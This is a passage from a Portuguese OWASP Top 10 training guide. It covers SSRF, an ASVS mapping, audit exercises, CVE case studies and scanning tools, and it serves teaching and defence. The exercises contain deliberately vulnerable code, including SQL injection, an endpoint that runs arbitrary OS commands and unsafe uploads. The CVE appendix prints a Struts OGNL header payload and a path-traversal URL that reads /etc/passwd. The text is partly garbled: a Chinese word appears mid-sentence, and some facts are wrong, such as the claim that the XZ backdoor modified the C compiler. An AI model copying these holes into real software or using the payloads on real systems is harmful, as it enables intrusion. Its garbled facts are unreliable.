4. **Disable Unused Schemes**: Bloqueie protocolos como `file://`, `gopher://`
5. **Response Filtering**: Filtre a resposta para remover dados sensíveis
6. **IMDSv2**: Use IMDSv2 no AWS para proteger metadados
7. **Firewall Rules**: Implemente regras de firewall para bloquear tráfego interno

### Caso de Estudo — Capital One (2019)

**Data**: Julho de 2019
**Impacto**: 100 milhões de pessoas afetadas
**CVE**: Relacionado a SSRF + IAM misconfiguration
**CVSS**: 8.5 (Alto)

Uma pessoa do Capital One explorou uma vulnerabilidade de SSRF em um firewall web para acessar credenciais IAM expostas, que随后 foram usadas para acessar dados sensíveis no S3.

**Lição**: SSRF não é apenas sobre acessar URLs — é sobre o que o servidor pode acessar que o atacante não deveria.

---

## OWASP ASVS Mapping

### O Que é ASVS

O OWASP Application Security Verification Standard (ASVS) fornece um framework para verificar a segurança de aplicações web. Cada categoria do Top 10 se mapeia para requisitos específicos do ASVS.

### Mapeamento Top 10 → ASVS

| OWASP Top 10 | ASVS Chapters | Requisitos Principais |
|-------------|---------------|----------------------|
| A01: Broken Access Control | V4, V5 | V4.1 (OWASP Provisions), V5.1 (Access Control) |
| A02: Cryptographic Failures | V6 | V6.1 (Data Classification), V6.2 (Crypto) |
| A03: Injection | V5 | V5.1 (Input Validation), V5.2 (Sanitization) |
| A04: Insecure Design | V4, V14 | V4.2 (Security Architecture), V14.1 (Secure SDLC) |
| A05: Security Misconfiguration | V11, V15 | V11.1 (Secure Configuration), V15.1 (Error Handling) |
| A06: Vulnerable Components | V14 | V14.1 (Secure SDLC), V14.2 (Dependency Management) |
| A07: Authentication Failures | V2 | V2.1 (Password Security), V2.2 (General Auth) |
| A08: Integrity Failures | V14 | V14.2 (Dependency Management), V14.3 (Secure Build) |
| A09: Logging Failures | V7 | V7.1 (Logging), V7.2 (Log Protection) |
| A10: SSRF | V5 | V5.1 (Input Validation), V5.2 (Sanitization) |

### Níveis de Verificação ASVS

| Nível | Descrição | Uso Recomendado |
|-------|-----------|-----------------|
| Level 1 | Mínimo | Aplicações de baixo risco, apps internas |
| Level 2 | Moderado | Aplicações com dados sensíveis |
| Level 3 | Alto | Aplicações críticas, financeiras, de saúde |

### Exemplo de Mapeamento para A01 (Broken Access Control)

```
ASVS V4.1.1: Verify that the application enforces access control
             decisions at a trusted service layer.

ASVS V5.1.1: Verify that the application enforces access control
             at a trusted service layer.

ASVS V5.1.2: Verify that all access control decisions are logged
             and auditable.

ASVS V5.1.3: Verify that the application enforces least privilege
             access control.
```

---

## Exercícios

### Exercício 1: Identificação de Broken Access Control

Analise o código abaixo e identifique todas as vulnerabilidades de Broken Access Control:

```javascript
// API de gerenciamento de pedidos
app.get('/api/orders/:orderId', async (req, res) => {
    const { orderId } = req.params;
    const order = await Order.findById(orderId);
    res.json(order);
});

app.put('/api/orders/:orderId', async (req, res) => {
    const { orderId } = req.params;
    const updates = req.body;
    const order = await Order.findByIdAndUpdate(orderId, updates, { new: true });
    res.json(order);
});

app.delete('/api/orders/:orderId', async (req, res) => {
    const { orderId } = req.params;
    await Order.findByIdAndDelete(orderId);
    res.json({ success: true });
});

app.get('/api/admin/users', async (req, res) => {
    const users = await User.find().select('-password');
    res.json(users);
});
```

**Tarefa**: Identifique cada vulnerabilidade e proponha correções.

### Exercício 2: Cryptographic Failures

Identifique os problemas criptográficos no código Python abaixo:

```python
import hashlib
import base64
from Crypto.Cipher import DES

def process_sensitive_data(data, key):
    # Hash da senha
    password_hash = hashlib.md5(data['password'].encode()).hexdigest()

    # Encriptar dados
    cipher = DES.new(key, DES.MODE_ECB)
    padded_data = data['content'] + ' ' * (8 - len(data['content']) % 8)
    encrypted = cipher.encrypt(padded_data.encode())

    return {
        'password_hash': password_hash,
        'encrypted_data': base64.b64encode(encrypted).decode()
    }
```

**Tarefa**: Liste cada problema e implemente uma versão segura.

### Exercício 3: SQL Injection Prevention

Implemente uma função segura de busca de usuários que previna SQL injection em cada cenário:

1. Busca por nome de usuário (exato)
2. Busca por e-mail (parcial, com LIKE)
3. Busca com múltiplos filtros (nome, email, role, data de criação)
4. Paginação com ordenação dinâmica

### Exercício 4: Secure Authentication System

Implemente um sistema de autenticação completo e seguro com:

1. Cadastro de usuários com validação de senha (NIST 800-63B)
2. Login com rate limiting e account lockout
3. MFA usando TOTP (Google Authenticator)
4. Recuperação de senha segura
5. Invalidação de sessão

### Exercício 5: SSRF Protection

Implemente um proxy seguro que:

1. Valide URLs contra uma whitelist
2. Bloqueie acesso a redes privadas
3. Previna DNS rebinding
4. Limite o tamanho da resposta
5. Implemente timeout adequado

### Exercício 6: Security Logging

Implemente um sistema de logging de segurança que:

1. Registre todos os eventos de autenticação
2. Detecte padrões de brute force
3. Gere alertas automáticos
4. Mantenha logs imutáveis
5. Implemente retenção de logs

### Exercício 7: Supply Chain Security

Analise o pipeline CI/CD abaixo e identifique vulnerabilidades:

```yaml
steps:
  - uses: actions/checkout@v2
  - run: npm install
  - run: npm test
  - run: npm publish
```

**Tarefa**: Reescreva o pipeline com todas as verificações de segurança necessárias.

**Problemas Identificados**:
1. `actions/checkout@v2` — versão antiga, sem verificação de commit assinado
2. `npm install` — sem lock file verification, sem auditoria de dependências
3. `npm test` — sem etapa de SAST
4. `npm publish` — sem verificação de integridade, sem notificação
5. Ausência total de scans de segurança

---

### Exercício 8: Vulnerabilidade em Código Real

Analise o endpoint abaixo e encontre todas as vulnerabilidades:

```python
@app.route('/api/users/<int:user_id>/profile', methods=['GET'])
def get_profile(user_id):
    user = db.execute(
        f"SELECT * FROM users WHERE id = {user_id}"
    ).fetchone()
    if user:
        return jsonify({
            'id': user['id'],
            'name': user['name'],
            'email': user['email'],
            'password_hash': user['password_hash'],
            'ssn': user['ssn'],
            'credit_card': user['credit_card']
        })
    return jsonify({'error': 'User not found'}), 404

@app.route('/api/upload', methods=['POST'])
def upload():
    file = request.files['file']
    file.save(f'/var/www/uploads/{file.filename}')
    return jsonify({'status': 'ok'})

@app.route('/api/execute', methods=['POST'])
def execute_command():
    cmd = request.json.get('command')
    output = os.popen(cmd).read()
    return jsonify({'output': output})
```

**Tarefa**: Identifique pelo menos 8 vulnerabilidades e proponha correções detalhadas para cada uma.

**Resolução Esperada**:

| # | Vulnerabilidade | Categoria OWASP | Severidade |
|---|----------------|-----------------|------------|
| 1 | SQL Injection (f-string na query) | A03: Injection | Crítica |
| 2 | Exposição de dados sensíveis (password_hash, ssn, credit_card) | A02: Cryptographic Failures | Crítica |
| 3 | Sem verificação de autenticação | A07: Authentication Failures | Alta |
| 4 | Sem verificação de autorização (IDOR) | A01: Broken Access Control | Alta |
| 5 | Path traversal no upload | A03: Injection | Crítica |
| 6 | Sem validação de tipo de arquivo | A05: Security Misconfiguration | Alta |
| 7 | OS Command Injection | A03: Injection | Crítica |
| 8 | Sem rate limiting | A07: Authentication Failures | Média |
| 9 | Sem logging de acesso | A09: Logging Failures | Média |
| 10 | Sem headers de segurança | A05: Security Misconfiguration | Média |

---

### Exercício 9: Criptografia Prática

Implemente um sistema de armazenamento seguro para dados sensíveis que atenda aos seguintes requisitos:

1. **Encriptação de dados em repouso**: Use AES-256-GCM
2. **Gerenciamento de chaves**: Implemente rotação de chaves
3. **Hash de senhas**: Use Argon2id com parâmetros adequados
4. **Integração HMAC**: Assine dados para detectar adulteração
5. **Key Derivation**: Derive chaves a partir de uma senha mestre com PBKDF2

```python
# Estrutura esperada
class SecureStorage:
    def __init__(self, master_key: bytes):
        """
        Inicializa o armazenamento seguro.

        Args:
            master_key: Chave mestre de 32 bytes (256 bits)
        """
        pass

    def encrypt(self, plaintext: str, associated_data: bytes = None) -> dict:
        """
        Encripta dados com AES-256-GCM.

        Returns:
            dict com nonce, ciphertext e tag
        """
        pass

    def decrypt(self, nonce: bytes, ciphertext: bytes, tag: bytes,
                associated_data: bytes = None) -> str:
        """
        Decripta dados com verificação de integridade.
        """
        pass

    def derive_key(self, purpose: str, version: int = None) -> bytes:
        """
        Derive uma chave específica para um propósito.
        Suporta versionamento para rotação de chaves.
        """
        pass

    def rotate_key(self, old_version: int) -> int:
        """
        Rotaciona as chaves. Retorna a nova versão.
        """
        pass
```

**Tarefa**: Implemente cada método, documentando as decisões de design.

---

### Exercício 10: Security Audit

Realize um audit completo de segurança na aplicação abaixo. Crie um relatório que inclua:

1. Lista de vulnerabilidades encontradas (mínimo 10)
2. Severidade de cada vulnerabilidade (CVSS aproximado)
3. Categoria OWASP Top 10 correspondente
4. Código vulnerável e correção para cada uma
5. Recomendações de melhoria arquitetural

```javascript
// app.js - Aplicação de e-commerce simplificada
const express = require('express');
const jwt = require('jsonwebtoken');
const sqlite3 = require('sqlite3').verbose();

const app = express();
const db = new sqlite3.Database(':memory:');
const SECRET = 'super-secret-key-123';

app.use(express.json());

// Setup database
db.serialize(() => {
    db.run("CREATE TABLE users (id INTEGER PRIMARY KEY, username TEXT, password TEXT, role TEXT)");
    db.run("CREATE TABLE products (id INTEGER PRIMARY KEY, name TEXT, price REAL, stock INTEGER)");
    db.run("CREATE TABLE orders (id INTEGER PRIMARY KEY, user_id INTEGER, product_id INTEGER, quantity INTEGER)");
});

// Login
app.post('/api/login', (req, res) => {
    const { username, password } = req.body;
    db.get(`SELECT * FROM users WHERE username='${username}' AND password='${password}'`, (err, user) => {
        if (user) {
            const token = jwt.sign({ id: user.id, role: user.role }, SECRET);
            res.json({ token });
        } else {
            res.status(401).json({ error: 'Invalid credentials' });
        }
    });
});

// Register
app.post('/api/register', (req, res) => {
    const { username, password, role } = req.body;
    db.run(`INSERT INTO users (username, password, role) VALUES ('${username}', '${password}', '${role || 'user'}')`);
    res.json({ message: 'User created' });
});

// Get product
app.get('/api/products/:id', (req, res) => {
    db.get(`SELECT * FROM products WHERE id=${req.params.id}`, (err, product) => {
        res.json(product || { error: 'Not found' });
    });
});

// Create order
app.post('/api/orders', (req, res) => {
    const token = req.headers.authorization;
    try {
        const decoded = jwt.verify(token, SECRET);
        const { product_id, quantity } = req.body;
        db.run(`INSERT INTO orders (user_id, product_id, quantity) VALUES (${decoded.id}, ${product_id}, ${quantity})`);
        res.json({ message: 'Order created' });
    } catch (e) {
        res.status(401).json({ error: 'Invalid token' });
    }
});

// Admin: delete user
app.delete('/api/users/:id', (req, res) => {
    db.run(`DELETE FROM users WHERE id=${req.params.id}`);
    res.json({ message: 'User deleted' });
});

// Admin: get all orders
app.get('/api/admin/orders', (req, res) => {
    db.all('SELECT * FROM orders', (err, orders) => {
        res.json(orders);
    });
});

// Export data
app.get('/api/export', (req, res) => {
    const format = req.query.format;
    if (format === 'csv') {
        res.setHeader('Content-Type', 'text/csv');
        res.setHeader('Content-Disposition', 'attachment; filename="data.csv"');
    }
    db.all('SELECT * FROM users', (err, users) => {
        res.json(users);
    });
});

app.listen(3000);
```

**Relatório Esperado (formato)**:

```
# Security Audit Report - app.js

## Resumo
- Total de vulnerabilidades: [N]
- Críticas: [N]
- Altas: [N]
- Médias: [N]

## Vulnerabilidades Detalhadas

### VULN-001: SQL Injection no Login
- **Categoria**: A03: Injection
- **CVSS**: 9.8 (Crítico)
- **Localização**: app.js, linha XX
- **Código Vulnerável**: [trecho]
- **Impacto**: Autenticação bypass completa
- **Correção**: [código corrigido]

### VULN-002: ...
```

---

## Resumo

### Checklist de Segurança — OWASP Top 10

| Categoria | Ação Principal | Prioridade |
|-----------|---------------|-----------|
| A01: Broken Access Control | Verificar ownership em cada endpoint | Crítica |
| A02: Cryptographic Failures | TLS 1.2+ + Argon2 + Key rotation | Crítica |
| A03: Injection | Prepared statements + input validation | Crítica |
| A04: Insecure Design | Threat modeling antes de codificar | Alta |
| A05: Security Misconfiguration | Hardening de todos os componentes | Alta |
| A06: Vulnerable Components | SCA + automated updates | Alta |
| A07: Authentication Failures | MFA + rate limiting + lockout | Crítica |
| A08: Integrity Failures | Signed builds + SBOM | Média |
| A09: Logging Failures | Centralized logging + alerting | Alta |
| A10: SSRF | URL validation + network segmentation | Alta |

### Princípios Fundamentais

1. **Defesa em Profundidade**: Nunca dependa de uma única camada de segurança
2. **Menor Privilégio**: Conceda apenas o necessário
3. **Fail Secure**: O sistema deve falhar para um estado seguro
4. **Zero Trust**: Não confie em nada, verifique tudo
5. **Segurança por Padrão**: Configurações padrão devem ser as mais seguras

---

## Apêndice A: Análise Detalhada de CVEs Reais

### CVE-2023-34362 — MOVEit Transfer SQL Injection

**Data**: 27 de maio de 2023
**Vulnerabilidade**: SQL Injection não autenticada
**CVSS**: 9.8 (Crítico)
**Afetados**: MOVEit Transfer (Progress Software)

**Mecanismo de Exploração**:
O atacante (grupo Clop) explora uma SQL injection em um endpoint não autenticado do MOVEit Transfer. A vulnerabilidade permite que o atacante execute queries SQL arbitrárias no banco de dados SQL Server, incluindo:
- Criação de contas de administrador
- Exfiltração de dados
- Injeção de webshells

**Linha de Código Vulnerável (Conceitual)**:
```csharp
// MOVEit Transfer - ProcessQueryHandler
// Vulnerabilidade: SQL injection em parâmetro não sanitizado
string query = "SELECT * FROM Users WHERE Username = '" + username + "'";
```

**Impacto Real**:
- Mais de 2.500 organizações afetadas
- Dados de milhões de indivíduos comprometidos
- Custos estimados: bilhões de dólares
- Grupos de ransomware usaram a vulnerabilidade para extorsão em massa

**Lição**: SQL injection continua sendo devastadora mesmo em 2023. A existência de endpoints não autenticados com acesso ao banco de dados é um design inseguro.

---

### CVE-2024-3094 — XZ Utils Backdoor

**Data**: 29 de março de 2024
**Vulnerabilidade**: Backdoor em sistema de build
**CVSS**: 10.0 (Crítico)
**Afetados**: xz-utils 5.6.0 e 5.6.1

**Timeline do Ataque**:
1. **Novembro 2021**: Atacante ("Jia Tan") começa a contribuir para o projeto
2. **2022-2023**: Gera confiança gradualmente, tornando-se maintainer
3. **Janeiro 2024**: Injeta código malicioso no script de build
4. **Março 2024**: Backdoor é detectada por Andreas Freund (Microsoft)
5. **Março 2024**: Versões comprometidas são removidas

**Mecanismo**:
O backdoor modificava o compilador C para injetar código em binários que usavam liblzma. O código injetado permitia remote code execution via SSH, sem autenticação.

**Lição**: Supply chain attacks são um dos vetores mais perigosos. A confiança gradual é uma técnica eficaz de engenharia social.

---

### CVE-2017-5638 — Apache Struts

**Data**: 7 de março de 2017
**Vulnerabilidade**: Remote Code Execution via Jakarta Multipart parser
**CVSS**: 10.0 (Crítico)
**Afetados**: Apache Struts 2.3.x (2.3.5 até 2.3.31) e 2.5.x (2.5.0 até 2.5.10)

**Mecanismo de Exploração**:
O parser Jakarta Multipart processava Content-Type de forma insegura. Um atacante poderia injetar expressões OGNL (Object-Graph Navigation Language) no header Content-Type, que seriam executadas como código Java.

```
Content-Type: %{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Test','true')}
```

**Impacto**: Equifax Breach (2017) — 147 milhões de pessoas afetadas, custo estimado de US$ 1.4 bilhão.

---

### CVE-2019-11510 — Pulse Secure VPN

**Data**: 24 de abril de 2019
**Vulnerabilidade**: Arbitrary File Read
**CVSS**: 10.0 (Crítico)
**Afetados**: Pulse Secure Connect Secure, Pulse Policy Secure

**Mecanismo**:
Path traversal allows unauthenticated access to arbitrary files, including the session database with active user credentials.

**Exploit**:
```
https://vpn.example.com/dana-na/../dana/html5acc/guacamole/../../../../../../etc/passwd
```

**Impacto**: Credenciais de VPN de milhares de empresas foram comprometidas, incluindo agências governamentais.

---

### CVE-2020-1472 — Zerologon

**Data**: 3 de setembro de 2020
**Vulnerabilidade**: Authentication Bypass em Netlogon
**CVSS**: 10.0 (Crítico)
**Afetados**: Windows Server (todas as versões suportadas)

**Mecanismo**:
O protocolo Netlogon usa uma criptografia fraca. Um atacante pode forçar a senha de uma conta de domínio para uma string vazia em 256 tentativas.

**Impacto**: Comprometimento completo de domínios Active Directory em minutos.

---

### CVE-2021-41773 / CVE-2021-42013 — Apache HTTP Server

**Data**: 1 de outubro de 2021 / 5 de outubro de 2021
**Vulnerabilidade**: Path Traversal + RCE
**CVSS**: 9.8 (Crítico)

**Mecanismo**:
URL encoding bypass na normalização de paths permitia acesso a arquivos fora do diretório web root. A combinação com mod_cgi permitia remote code execution.

---

### CVE-2022-22965 — Spring4Shell

**Data**: 31 de março de 2022
**Vulnerabilidade**: RCE via Class Loader Access
**CVSS**: 9.8 (Crítico)

**Mecanismo**:
Em aplicações Java com JDK 9+ e Spring Framework, um atacante pode manipular o ClassLoader para injetar webshell em logs de acesso.

---

## Apêndice B: Ferramentas de Detecção e Prevenção

### SAST (Static Application Security Testing)

```bash
# Bandit - Python SAST
pip install bandit
bandit -r src/ -f json -o report.json

# Semgrep - Multi-language SAST
pip install semgrep
semgrep --config=p/security-audit src/
semgrep --config=p/owasp-top-ten src/

# ESLint Security - JavaScript SAST
npm install --save-dev eslint-plugin-security
# .eslintrc.json
{
  "plugins": ["security"],
  "extends": ["plugin:security/recommended"]
}

# Gosec - Go SAST
go install github.com/securego/gosec/v2/cmd/gosec@latest
gosec ./...
```

### DAST (Dynamic Application Security Testing)

```bash
# OWASP ZAP - Automated DAST
docker run -t ghcr.io/zaproxy/zaproxy:stable zap-full-scan.py \
    -t https://target.example.com \
    -r report.html

# Nikto - Web Server Scanner
nikto -h https://target.example.com

# Nmap - Port Scanning + Service Detection
nmap -sV -sC -p- target.example.com
```

### SCA (Software Composition Analysis)

```bash
# OWASP Dependency-Check
dependency-check --project "My Project" \
    --scan ./src \
    --format HTML \
    --out ./report

# npm audit (Node.js)
npm audit
npm audit fix

# pip-audit (Python)
pip-audit -r requirements.txt

# Safety (Python)
safety check -r requirements.txt

# Trivy (Multi-language + container scanning)
trivy fs .
trivy image myapp:latest
```

### Container Security

```bash
# Trivy - Container vulnerability scanning
trivy image nginx:latest

# Docker Bench Security - CIS Benchmark
docker run --net host --pid host --userns host --cap-add audit_control \
    -e DOCKER_CONTENT_TRUST=$DOCKER_CONTENT_TRUST \
    -v /var/lib:/var/lib:ro \
    -v /var/run/docker.sock:/var/run/docker.sock:ro \
    -v /usr/lib/systemd:/usr/lib/systemd:ro \
    docker/docker-bench-security

# Snyk Container
snyk container test myapp:latest
```

### Secrets Detection

```bash
# GitLeaks - Detect secrets in git repos
gitleaks detect --source . --report-format json

# TruffleHog - Find credentials in repos
trufflehog git file://. --only-verified

# detect-secrets (Yelp)
detect-secrets scan --all-files
```

---

## Apêndice C: Security Headers Completos

### Referência Rápida de Headers

```
# HSTS - Force HTTPS
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload

# CSP - Content Security Policy
Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; font-src 'self'; connect-src 'self'; media-src 'self'; object-src 'none'; frame-src 'none'; base-uri 'self'; form-action 'self'; frame-ancestors 'none'; upgrade-insecure-requests

# X-Frame-Options - Prevent Clickjacking
X-Frame-Options: DENY

# X-Content-Type-Options - Prevent MIME Sniffing
X-Content-Type-Options: nosniff

# X-XSS-Protection - Legacy XSS Filter
X-XSS-Protection: 1; mode=block

# Referrer-Policy - Control Referrer Information
Referrer-Policy: strict-origin-when-cross-origin

# Permissions-Policy - Feature Policy
Permissions-Policy: geolocation=(), microphone=(), camera=(), payment=(), usb=()

# X-DNS-Prefetch-Control
X-DNS-Prefetch-Control: off

# Cross-Origin Policies
Cross-Origin-Opener-Policy: same-origin
Cross-Origin-Embedder-Policy: require-corp
Cross-Origin-Resource-Policy: same-origin
```

### Implementação por Framework

```python
# Django - security_settings.py
SECURE_BROWSER_XSS_FILTER = True
SECURE_CONTENT_TYPE_NOSNIFF = True
SECURE_HSTS_SECONDS = 31536000
SECURE_HSTS_INCLUDE_SUBDOMAINS = True
SECURE_HSTS_PRELOAD = True
SECURE_SSL_REDIRECT = True
SECURE_PROXY_SSL_HEADER = ('HTTP_X_FORWARDED_PROTO', 'https')
SESSION_COOKIE_SECURE = True
CSRF_COOKIE_SECURE = True
SESSION_COOKIE_HTTPONLY = True
CSRF_COOKIE_HTTPONLY = True
X_FRAME_OPTIONS = 'DENY'
```

```javascript
// Express.js - security middleware
const helmet = require('helmet');

app.use(helmet());

app.use(helmet.contentSecurityPolicy({
    directives: {
        defaultSrc: ["'self'"],
        scriptSrc: ["'self'"],
        styleSrc: ["'self'", "'unsafe-inline'"],
        imgSrc: ["'self'", "data:", "https:"],
        fontSrc: ["'self'"],
        connectSrc: ["'self'"],
        objectSrc: ["'none'"],
        frameSrc: ["'none'"],
        baseUri: ["'self'"],
        formAction: ["'self'"],
        frameAncestors: ["'none'"],
        upgradeInsecureRequests: []
    }
}));

app.use(helmet.hsts({
    maxAge: 31536000,
    includeSubDomains: true,
    preload: true
}));

app.use(helmet.referrerPolicy({
    policy: 'strict-origin-when-cross-origin'
}));

app.use(helmet.permittedCrossDomainPolicies({
    permittedPolicies: 'none'
}));
```

---

## Apêndice D: Modelos de Ameaça

### STRIDE (Microsoft)

| Modelo | Categoria | Pergunta-Chave | OWASP Top 10 |
|--------|-----------|----------------|-------------|
| **S**poofing | Autenticação | Alguém pode se passar por outro? | A07 |
| **T**ampering | Integridade | Dados podem ser alterados? | A08 |
| **R**epudiação | Logging | Ações podem ser negadas? | A09 |
| **I**nformation Disclosure | Confidencialidade | Dados sensíveis podem ser expostos? | A02 |
| **D**enial of Service | Disponibilidade | O sistema pode ser indisponibilizado? | A04 |
| **E**levation of Privilege | Autorização | Um usuário pode obter privilégios extras? | A01 |

### PASTA (Process for Attack Simulation and Threat Analysis)

1. **Passo 1**: Definir objetivos do sistema
2. **Passo 2**: Documentar aplicação
3. **Passo 3**: Identificar ativos
4. **Passo 4**: Identificar ameaças
5. **Passo 5**: Criar árvore de ataque
6. **Passo 6**: Analisar e contabilizar ameaças
7. **Passo 7**: Identificar controles
8. **Passo 8**: Resolver ameaças

### DREAD (Risco)

| Fator | Pergunta | Escala |
|-------|----------|--------|
| **D**amage | Quão grande é o dano potencial? | 1-10 |
| **R**eproducibility | O ataque é fácil de reproduzir? | 1-10 |
| **E**xploitability | Quão fácil é explorar? | 1-10 |
| **A**ffected users | Quantos usuários são afetados? | 1-10 |
| **D**iscoverability | O quão fácil é descobrir a vulnerabilidade? | 1-10 |

---

## Apêndice E: Árvore de Decisão para Escolha de Controles

### Fluxo de Decisão: Qual Vulnerabilidade Estou Enfrentando?

```
[Inicio]
    |
    [Dados sendo injetados em interpretador?]
    |          |
    SIM        NAO
    |          |
    [A03: Injection]    [Controle de acesso esta funcionando?]
                              |
                         SIM  |  NAO
                              |      |
                              |   [A01: Broken Access Control]
                              |
                         [Dados estao protegidos criptograficamente?]
                              |
                         SIM  |  NAO
                              |      |
                              |   [A02: Cryptographic Failures]
                              |
                         [Componentes estao atualizados?]
                              |
                         SIM  |  NAO
                              |      |
                              |   [A06: Vulnerable Components]
                              |
                         [Autenticacao e robusta?]
                              |
                         SIM  |  NAO
                              |      |
                              |   [A07: Authentication Failures]
                              |
                         [Servidor pode fazer requests para destinos arbitrarios?]
                              |
                         SIM  |  NAO
                              |      |
                              |   [A10: SSRF]
                              |
                         [Logging e monitoramento estao funcionando?]
                              |
                         SIM  |  NAO
                              |      |
                              |   [A09: Logging Failures]
```

### Árvore de Decisão: Framework de Resposta

```
[Vulnerabilidade identificada]
    |
    [Eh uma falha de design?]
    |          |
    SIM        NAO
    |          |
    [A04: Insecure Design]   [Eh uma configuracao?]
    | Requer:                  |
    | - Threat Modeling        SIM  |  NAO
    | - Arquitetura segura     |      |
    | - Padroes de design      |   [Eh um componente?]
                              |      |
                              |   SIM  |  NAO
                              |   |      |
                              | [A05]  [Verificar secao 08]
                              | Config  Integrity
```

### Matriz de Severidade por Categoria

| Categoria | Baixa | Média | Alta | Crítica |
|-----------|-------|-------|------|---------|
| A01: Broken Access Control | IDOR sem dados sensíveis | Force browsing | Privilege escalation | Full system compromise |
| A02: Cryptographic Failures | Algoritmo deprecado | Chave curta | Sem TLS | Chaves expostas |
| A03: Injection | Reflected XSS | Stored XSS | SQL injection | OS command injection |
| A04: Insecure Design | Falta de validação | Falta de rate limit | Falta de MFA | Sem authorization |
| A05: Security Misconfiguration | Header ausente | Verbose errors | Default creds | Debug mode on |
| A06: Vulnerable Components | Versão antiga | CVEs de baixo severity | CVEs de alto severity | CVE crítico ativo |
| A07: Authentication Failures | Senha fraca | Sem MFA | Sem lockout | Session hijacking |
| A08: Integrity Failures | Sem checksum | Sem assinatura | Supply chain | Backdoor |
| A09: Logging Failures | Logs incompletos | Sem alertas | Sem retenção | Sem logging |
| A10: SSRF | Leitura de arquivo | Acesso a internos | RCE via SSRF | AWS metadata |

### Checklist de Verificação por OWASP Top 10

```
A01: Broken Access Control
  [ ] Todo endpoint tem verificacao de ownership
  [ ] Controle de acesso e feito server-side
  [ ] Deny by default esta implementado
  [ ] Tokens JWT tem expiry adequado
  [ ] CORS esta configurado restritivamente
  [ ] Rate limiting esta ativo em endpoints sensíveis

A02: Cryptographic Failures
  [ ] TLS 1.2+ e obrigatorio
  [ ] HSTS esta configurado
  [ ] Senhas usam Argon2id ou bcrypt
  [ ] Dados sensiveis estao encriptados em repouso
  [ ] Chaves sao armazenadas em Secrets Manager
  [ ] Rotação de chaves esta implementada

A03: Injection
  [ ] Queries usam prepared statements
  [ ] Input validation e feita em todos os endpoints
  [ ] ORM e usado quando possivel
  [ ] OS commands usam argumentos separados
  [ ] LDAP filters sao escapados adequadamente
  [ ] WAF esta ativo

A04: Insecure Design
  [ ] Threat modeling foi realizado
  [ ] Design review de seguranca foi feito
  [ ] Padroes de seguranca sao seguidos
  [ ] Business logic flows foram validados
  [ ] Rate limiting e implementado
  [ ] Fail-secure esta implementado

A05: Security Misconfiguration
  [ ] Credenciais padrao foram removidas
  [ ] Debug mode esta desligado em producao
  [ ] Headers de seguranca estao configurados
  [ ] Server tokens estao ocultos
  [ ] Servicos desnecessarios estao desabilitados
  [ ] Error pages nao expoe informacoes sensiveis

A06: Vulnerable Components
  [ ] SBOM esta atualizado
  [ ] SCA esta rodando no CI/CD
  [ ] Dependencias sao atualizadas regularmente
  [ ] CVEs sao monitoradas
  [ ] Lock files estao commitados
  [ ] Updates automaticos estao configurados

A07: Authentication Failures
  [ ] MFA esta disponivel e incentivado
  [ ] Rate limiting esta ativo no login
  [ ] Account lockout esta implementado
  [ ] Senhas sao verificadas contra HIBP
  [ ] Sessions tokens sao seguros
  [ ] Password reset tem protecoes adequate

A08: Integrity Failures
  [ ] Builds sao assinados digitalmente
  [ ] Checksums sao verificados
  [ ] Deserialization insegura e evitada
  [ ] CI/CD pipeline tem verificacoes de seguranca
  [ ] Dependencies sao verificadas antes de install
  [ ] Supply chain security e monitorada

A09: Logging Failures
  [ ] Eventos de autenticacao sao logados
  [ ] Logs sao centralizados (SIEM)
  [ ] Alertas estao configurados
  [ ] Logs sao imutaveis
  [ ] Retencao de logs e definida
  [ ] Correlation IDs sao usados

A10: SSRF
  [ ] URLs sao validadas contra whitelist
  [ ] Redes privadas sao bloqueadas
  [ ] DNS resolution e verificada
  [ ] Response size e limitada
  [ ] Timeout e configurado
  [ ] IMDSv2 e usado no AWS
```

---

## Apêndice F: Quick Reference Card — OWASP Top 10 2021

### Resumo Visual para Equipes

```
╔══════════════════════════════════════════════════════════════════════════╗
║                    OWASP TOP 10 2021 — QUICK REFERENCE                  ║
╠══════════════════════════════════════════════════════════════════════════╣
║ A01  BROKEN ACCESS CONTROL        ┃ 55.97%  ┃ Verified Ownership      ║
║ A02  CRYPTOGRAPHIC FAILURES       ┃ 4.64%   ┃ TLS 1.2+ + Argon2      ║
║ A03  INJECTION                    ┃ 3.37%   ┃ Prepared Statements     ║
║ A04  INSECURE DESIGN              ┃ 3.00%   ┃ Threat Modeling         ║
║ A05  SECURITY MISCONFIGURATION    ┃ 4.51%   ┃ Hardening              ║
║ A06  VULNERABLE COMPONENTS        ┃ 8.77%   ┃ SCA + Updates           ║
║ A07  AUTHENTICATION FAILURES      ┃ 2.55%   ┃ MFA + Rate Limiting     ║
║ A08  INTEGRITY FAILURES           ┃ 2.05%   ┃ Signed Builds           ║
║ A09  LOGGING FAILURES             ┃ 6.51%   ┃ SIEM + Alerting         ║
║ A10  SSRF                         ┃ 2.72%   ┃ URL Validation          ║
╚══════════════════════════════════════════════════════════════════════════╝
```

### Priorização de Correção

**Fase 1 — Crítico (Corrigir imediatamente)**:
- A01: Broken Access Control
- A02: Cryptographic Failures
- A03: Injection
- A07: Authentication Failures

**Fase 2 — Alto (Corrigir no sprint atual)**:
- A05: Security Misconfiguration
- A06: Vulnerable Components
- A10: SSRF

**Fase 3 — Médio (Planejar para próximos sprints)**:
- A04: Insecure Design
- A08: Integrity Failures
- A09: Logging Failures

### Comandos Úteis para Auditoria Rápida

```bash
# Verificar dependencias vulneraveis (Node.js)
npm audit
npm audit --audit-level=high

# Verificar dependencias vulneraveis (Python)
pip-audit -r requirements.txt
safety check -r requirements.txt

# Scan de seguranca com Semgrep
semgrep --config=p/owasp-top-ten src/

# Scan de container
trivy image myapp:latest
trivy fs .

# Verificar headers de seguranca
curl -I https://target.example.com | grep -iE "strict-transport|x-frame|x-content-type|content-security"

# Verificar SSL/TLS
nmap --script ssl-enum-ciphers -p 443 target.example.com

# Verificar portas abertas
nmap -sV -sC target.example.com

# Verificar secrets no repositorio
gitleaks detect --source . --report-format json
trufflehog git file://. --only-verified
```

### Referencia Rapida de CVSS

| Score | Severidade | Acao |
|-------|-----------|------|
| 0.0 - 3.9 | Baixa | Corrigir quando possivel |
| 4.0 - 6.9 | Media | Corrigir no sprint atual |
| 7.0 - 8.9 | Alta | Corrigir imediatamente |
| 9.0 - 10.0 | Critica | Drop everything, fix now |

### Tempo Medio de Correcao por Severidade

| Severidade | Tempo Medio Recomendado |
|-----------|------------------------|
| Critica (9.0-10.0) | 24-48 horas |
